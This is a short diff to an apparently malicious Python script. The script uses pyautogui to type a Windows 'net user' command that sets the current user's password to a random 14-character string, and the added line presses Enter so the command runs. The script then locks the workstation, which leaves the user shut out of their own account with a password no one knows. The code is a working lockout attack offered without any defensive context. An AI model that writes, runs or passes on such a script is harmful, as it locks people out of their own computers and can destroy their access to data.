@@ -18,6 +18,7 @@ pyautogui.press("enter")
 password = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz",k=14))
 user = os.getlogin()
 pyautogui.write(f"net user {user} {password}")
+pyautogui.press("enter")
 windll.user32.LockWorkStation()
 
 # please be sure then run source
